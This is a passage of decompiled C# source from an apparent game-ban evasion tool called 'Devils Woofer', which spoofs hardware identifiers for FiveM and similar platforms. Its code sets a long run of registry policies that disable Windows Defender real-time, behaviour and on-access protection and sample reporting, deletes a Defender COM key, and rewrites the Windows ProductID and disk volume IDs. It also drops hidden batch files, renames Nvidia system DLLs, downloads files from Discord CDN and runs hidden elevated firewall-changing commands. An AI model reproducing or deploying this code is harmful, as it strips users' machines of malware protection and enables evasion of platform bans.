			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiVirus", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableSpecialRunningModes", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRoutinelyTakingAction", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "ServiceKeepAlive", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableRealtimeMonitoring", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates", "ForceUpdateFromMU", 0);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet", "DisableBlockAtFirstSeen", 1);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\MpEngine", "MpEnablePus", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "PUAProtection", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Policy Manager", "DisableScanningNetworkFiles", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRealtimeMonitoring", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Spynet", "SpyNetReporting", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Spynet", "SubmitSamplesConsent", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\MRT", "DontReportInfectionInformation", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\MRT", "DontOfferThroughWUAU", "1", RegistryValueKind.DWord);
			Registry.ClassesRoot.DeleteSubKeyTree("\\CLSID\\{09A47860-11B0-4DA5-AFA5-26D86198A780}", false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", "1", RegistryValueKind.DWord);
			string path = "C:\\Program Files\\Win64";
			bool flag3 = !Directory.Exists(path);
			if (flag3)
			{
				Directory.CreateDirectory(path);
			}
			bool flag4 = File.Exists("C:\\Program Files\\Win64\\net.bat");
			if (flag4)
			{
				Process.Start("C:\\Program Files\\Win64\\net.bat");
			}
			else
			{
				string text2 = "C:\\Program Files\\Win64\\net.bat";
				using (StreamWriter streamWriter2 = File.CreateText(text2))
				{
					streamWriter2.WriteLine("netsh int ip reset");
				}
				Process process2 = new Process();
				process2.StartInfo.FileName = text2;
				this.processlist.Add(process2);
				File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
				process2.Start();
			}
			Main.HWIDclick();
			Main.XBOXclick();
			Main.PCclick();
			Main.Diskclick();
			Main.FiveM();
			Main.New();
			Thread.Sleep(2000);
			string path2 = "C:\\Program Files\\Sounds";
			bool flag5 = !Directory.Exists(path2);
			if (flag5)
			{
				Directory.CreateDirectory(path2);
			}
			bool flag6 = File.Exists("C:\\Program Files\\Sounds\\fivemspoofed.wav");
			if (flag6)
			{
				new SoundPlayer("C:\\Program Files\\Sounds\\fivemspoofed.wav").Play();
			}
			else
			{
				string address = "https://cdn.discordapp.com/attachments/953684464104513571/959156445411180574/fivemspoofed.wav";
				string fileName = "C:\\Program Files\\Sounds\\fivemspoofed.wav";
				WebClient webClient = new WebClient();
				webClient.DownloadFile(address, fileName);
				File.SetAttributes("C:\\Program Files\\Sounds\\fivemspoofed.wav", FileAttributes.Hidden);
				new SoundPlayer("C:\\Program Files\\Sounds\\fivemspoofed.wav").Play();
			}
			MessageBox.Show("Spoofed FiveM, Use new rockstar,steam,discord and restart your pc!", "Devils Woofer - Fast CFX v2", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			File.Delete("C:\\Program Files\\Sounds\\fivemspoofed.wav");
		}

		// Token: 0x0600008D RID: 141 RVA: 0x000095D8 File Offset: 0x000077D8
		public static void ClickUnban()
		{
			List<Process> list = new List<Process>();
			Class1 @class = new Class1();
			@class.spoofUserMode();
			string path = "C:\\Program Files\\Win64";
			bool flag = !Directory.Exists(path);
			if (flag)
			{
				Directory.CreateDirectory(path);
			}
			bool flag2 = File.Exists("C:\\Program Files\\Win64\\net.bat");
			if (flag2)
			{
				Process.Start("C:\\Program Files\\Win64\\net.bat");
			}
			else
			{
				string text = "C:\\Program Files\\Win64\\net.bat";
				using (StreamWriter streamWriter = File.CreateText(text))
				{
					streamWriter.WriteLine("netsh int ip reset");
				}
				Process process = new Process();
				process.StartInfo.FileName = text;
				list.Add(process);
				File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
				process.Start();
			}
			Main.HWIDclick();
			Main.XBOXclick();
			Main.PCclick();
			Main.Diskclick();
			Main.FiveM();
			Main.New();
		}

		// Token: 0x0600008E RID: 142 RVA: 0x000096CC File Offset: 0x000078CC
		public static string GenID(int length)
		{
			string element = "123457869";
			return new string((from s in Enumerable.Repeat<string>(element, length)
			select s[Main.random.Next(s.Length)]).ToArray<char>());
		}

		// Token: 0x0600008F RID: 143 RVA: 0x0000971C File Offset: 0x0000791C
		public static string DiskGen(int length)
		{
			string element = "12345786789";
			return new string((from s in Enumerable.Repeat<string>(element, length)
			select s[Main.random.Next(s.Length)]).ToArray<char>());
		}

		// Token: 0x06000090 RID: 144 RVA: 0x00007C98 File Offset: 0x00005E98
		private void siticoneGradientButton1_Click_1(object sender, EventArgs e)
		{
			this.premiumpanel.BringToFront();
		}

		// Token: 0x06000091 RID: 145 RVA: 0x000030F6 File Offset: 0x000012F6
		private void timer3_Tick(object sender, EventArgs e)
		{
		}

		// Token: 0x06000092 RID: 146 RVA: 0x0000976C File Offset: 0x0000796C
		private void siticoneRoundedButton7_Click_3(object sender, EventArgs e)
		{
			Class1 @class = new Class1();
			@class.spoofUserMode();
			Main.HWIDclick();
			string value = string.Concat(new string[]
			{
				Main.GenerateString(5),
				"-",
				Main.GenerateString(5),
				"-",
				Main.GenerateString(5),
				"-",
				Main.GenerateString(5)
			});
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
			registryKey.SetValue("ProductID", value);
			registryKey.Close();
			Main.InstallDate();
			Main.Disk();
			Main.HWIDclick();
			Main.XBOXclick();
			Main.PCclick();
			Main.Diskclick();
			Main.New();
			Main.SpoofPCName();
			string path = "C:\\Program Files\\Win64";
			bool flag = !Directory.Exists(path);
			if (flag)
			{
				Directory.CreateDirectory(path);
			}
			bool flag2 = File.Exists("C:\\Program Files\\Win64\\net.bat");
			if (flag2)
			{
				Process.Start("C:\\Program Files\\Win64\\net.bat");
			}
			else
			{
				string text = "C:\\Program Files\\Win64\\net.bat";
				using (StreamWriter streamWriter = File.CreateText(text))
				{
					streamWriter.WriteLine("netsh int ip reset");
				}
				Process process = new Process();
				process.StartInfo.FileName = text;
				this.processlist.Add(process);
				File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
				process.Start();
			}
			bool flag3 = File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe");
			if (flag3)
			{
				File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
			}
			bool flag4 = File.Exists("C:\\Program Files\\Unlisted\\change.bat");
			if (flag4)
			{
				File.Delete("C:\\Program Files\\Unlisted\\change.bat");
			}
			string text2 = this.diskname.Text;
			string path2 = "C:\\Program Files\\Unlisted";
			bool flag5 = !Directory.Exists(path2);
			if (flag5)
			{
				Directory.CreateDirectory(path2);
			}
			bool flag6 = File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe");
			if (flag6)
			{
				string text3 = "C:\\Program Files\\Unlisted\\change.bat";
				using (StreamWriter streamWriter2 = File.CreateText(text3))
				{
					streamWriter2.WriteLine(string.Concat(new string[]
					{
						"volumeid.exe ",
						text2,
						": ",
						Main.DiskGen(4),
						"-",
						Main.DiskGen(4),
						" -nobanner"
					}));
				}
				Process process2 = new Process();
				process2.StartInfo.FileName = text3;
				this.processlist.Add(process2);
				File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
				process2.Start();
				File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
				File.Delete("C:\\Program Files\\Unlisted\\change.bat");
				Directory.Delete(path2);
			}
			else
			{
				string text4 = "C:\\Program Files\\Unlisted\\change.bat";
				using (StreamWriter streamWriter3 = File.CreateText(text4))
				{
					streamWriter3.WriteLine(string.Concat(new string[]
					{
						"volumeid.exe ",
						text2,
						": ",
						Main.DiskGen(4),
						"-",
						Main.DiskGen(4),
						" -nobanner"
					}));
				}
				Process process3 = new Process();
				process3.StartInfo.FileName = text4;
				this.processlist.Add(process3);
				File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
				process3.Start();
				File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
				File.Delete("C:\\Program Files\\Unlisted\\change.bat");
				Directory.Delete(path2);
			}
			MessageBox.Show("Spoofed All System", "Devils Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x06000093 RID: 147 RVA: 0x00009B1C File Offset: 0x00007D1C
		private void siticoneRoundedButton11_Click_3(object sender, EventArgs e)
		{
			Class1 @class = new Class1();
			@class.spoofUserMode();
			bool flag = File.Exists("C:\\Windows\\System32\\nvml.dll");
			if (flag)
			{
				try
				{
					File.Move("C:\\Windows\\System32\\nvml.dll", "C:\\Windows\\System32\\nvml2.dll");
					File.Move("C:\\Windows\\System32\\nvmld.dll", "C:\\Windows\\System32\\nvmld2.dll");
				}
				catch
				{
				}
			}
			MessageBox.Show("Cleaned Nvidia Logger!", "Devils Woofer Premium", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x06000094 RID: 148 RVA: 0x00009B94 File Offset: 0x00007D94
		private void premnew2_Click(object sender, EventArgs e)
		{
			Main.FiveM();
			Main.ClickUnban();
			MessageBox.Show("Spoofed G-Life Identifiers, Flash your bios and use vpn!", "Devils Woofer Premium", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x06000095 RID: 149 RVA: 0x000030F6 File Offset: 0x000012F6
		private void pictureBox1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000096 RID: 150 RVA: 0x00009BB8 File Offset: 0x00007DB8
		private void siticoneButton1_Click_2(object sender, EventArgs e)
		{
			string path = "C:\\Program Files\\Pictures";
			try
			{
				string text = "https://cdn.discordapp.com/attachments/954439038109102182/968512955140431912/lean_animated_logo.gif";
				string text2 = "C:\\Program Files\\Pictures\\leanlogo.gif";
				bool flag = !Directory.Exists(path);
				if (flag)
				{
					Directory.CreateDirectory(path);
				}
				bool flag2 = File.Exists(text2);
				if (flag2)
				{
					this.pictureBox1.Image = new Bitmap(text2);
				}
				else
				{
					WebClient webClient = new WebClient();
					webClient.DownloadFile(text, text2);
					this.pictureBox1.Image = new Bitmap(text);
				}
				string path2 = "C:\\Program Files\\Pictures\\imgsave.gif";
				File.Delete(path2);
				Thread.Sleep(50);
				this.pictureBox1.Image = new Bitmap(text2);
				Thread.Sleep(2000);
				DirectoryInfo directoryInfo = new DirectoryInfo("C:\\Program Files\\Saved");
				foreach (FileInfo fileInfo in directoryInfo.GetFiles())
				{
					fileInfo.Delete();
				}
				foreach (DirectoryInfo directoryInfo2 in directoryInfo.GetDirectories())
				{
					directoryInfo2.Delete(true);
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000097 RID: 151 RVA: 0x000030F6 File Offset: 0x000012F6
		private void siticoneLabel11_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000098 RID: 152 RVA: 0x000030F6 File Offset: 0x000012F6
		private void rstarbp_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000099 RID: 153 RVA: 0x000030F6 File Offset: 0x000012F6
		private void rstarbp_CheckedChanged_1(object sender, EventArgs e)
		{
		}

		// Token: 0x0600009A RID: 154 RVA: 0x00009CF8 File Offset: 0x00007EF8
		private void siticoneButton3_Click(object sender, EventArgs e)
		{
			bool flag = File.Exists("C:\\Program Files\\Win64\\net.bat");
			if (flag)
			{
				File.Move("C:\\Windows\\System32\\nvml2.dll", "C:\\Windows\\System32\\nvml.dll");
				File.Move("C:\\Windows\\System32\\nvmld2.dll", "C:\\Windows\\System32\\nvmld.dll");
			}
		}

		// Token: 0x0600009B RID: 155 RVA: 0x00009D38 File Offset: 0x00007F38
		private void siticoneButton3_Click_1(object sender, EventArgs e)
		{
			new Process
			{
				StartInfo = 
				{
					FileName = "cmd.exe",
					CreateNoWindow = true,
					RedirectStandardInput = true,
					RedirectStandardOutput = true,
					UseShellExecute = false,
					Verb = "runas",
					Arguments = "/C netsh advfirewall firewall add rule name = \"FiveM2372Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\fivem_b2372_gtaprocess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =out new enable= no > nul"
				}
			}.Start();
			MessageBox.Show("Fixed FiveM Bypass Error", "Devils Woofer", MessageBoxButtons.OK);
		}

		// Token: 0x0600009C RID: 156 RVA: 0x00009DC9 File Offset: 0x00007FC9
		private void siticoneLabel13_Click(object sender, EventArgs e)
		{
			Process.Start("https://discord.gg/unban");
		}

		// Token: 0x04000012 RID: 18
		private DiscordRpc.EventHandlers handlers;

		// Token: 0x04000013 RID: 19
		private DiscordRpc.RichPresence presence;

		// Token: 0x04000014 RID: 20
		public static string folder = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

		// Token: 0x04000015 RID: 21
		public static string specificFolder = Path.Combine(Main.folder, "DigitalEntitlements");

		// Token: 0x04000016 RID: 22
		public static Random random = new Random();

		// Token: 0x04000017 RID: 23
		private string xynw = Main.RandomString(5);

		// Token: 0x04000018 RID: 24
		private List<Process> processlist = new List<Process>();

		// Token: 0x0400005C RID: 92
		private SiticoneButton siticoneButton3;
	}
}
